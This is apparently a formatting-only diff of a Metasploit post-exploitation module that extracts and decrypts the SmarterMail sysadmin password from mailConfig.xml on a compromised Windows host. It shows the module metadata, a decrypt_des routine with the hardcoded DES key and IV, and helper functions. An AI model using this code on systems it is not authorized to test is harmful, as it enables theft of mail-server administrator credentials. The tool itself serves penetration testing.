@@ -3,36 +3,36 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'          => 'Windows Gather SmarterMail Password Extraction',
-      'Description'   => %q{
-        This module extracts and decrypts the sysadmin password in the
-        SmarterMail 'mailConfig.xml' configuration file. The encryption
-        key and IV are publicly known.
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather SmarterMail Password Extraction',
+        'Description' => %q{
+          This module extracts and decrypts the sysadmin password in the
+          SmarterMail 'mailConfig.xml' configuration file. The encryption
+          key and IV are publicly known.
 
-        This module has been tested successfully on SmarterMail versions
-        10.7.4842 and 11.7.5136.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Joe Giron',                           # Discovery and PoC (@theonlyevil1)
-        'bcoles', # Metasploit
-        'sinn3r'                               # shell session support
-      ],
-      'References'    =>
-        [
+          This module has been tested successfully on SmarterMail versions
+          10.7.4842 and 11.7.5136.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Joe Giron', # Discovery and PoC (@theonlyevil1)
+          'bcoles', # Metasploit
+          'sinn3r' # shell session support
+        ],
+        'References' => [
           ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
         ],
-      'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter', 'shell']
-    ))
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter', 'shell']
+      )
+    )
   end
 
   #
@@ -40,13 +40,13 @@ class MetasploitModule < Msf::Post
   #
   def decrypt_des(encrypted)
     return nil if encrypted.nil?
+
     decipher = OpenSSL::Cipher::DES.new
     decipher.decrypt
     decipher.key = "\xb9\x9a\x52\xd4\x58\x77\xe9\x18"
-    decipher.iv  = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
+    decipher.iv = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
     decipher.update(encrypted) + decipher.final
   end
-
 
   def get_bound_port(data)
     port = nil
@@ -61,11 +61,9 @@ class MetasploitModule < Msf::Post
     port
   end
 
-
   def get_remote_drive
     @drive ||= expand_path('%SystemDrive%').strip
   end
-
 
   def get_web_server_port
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
@@ -78,7 +76,6 @@ class MetasploitModule < Msf::Post
 
     return nil
   end
-
 
   #
   # Find SmarterMail 'mailConfig.xml' config file
@@ -103,7 +100,7 @@ class MetasploitModule < Msf::Post
   #
   def get_smartermail_creds(path)
     result = {}
-    data   = ''
+    data = ''
 
     vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
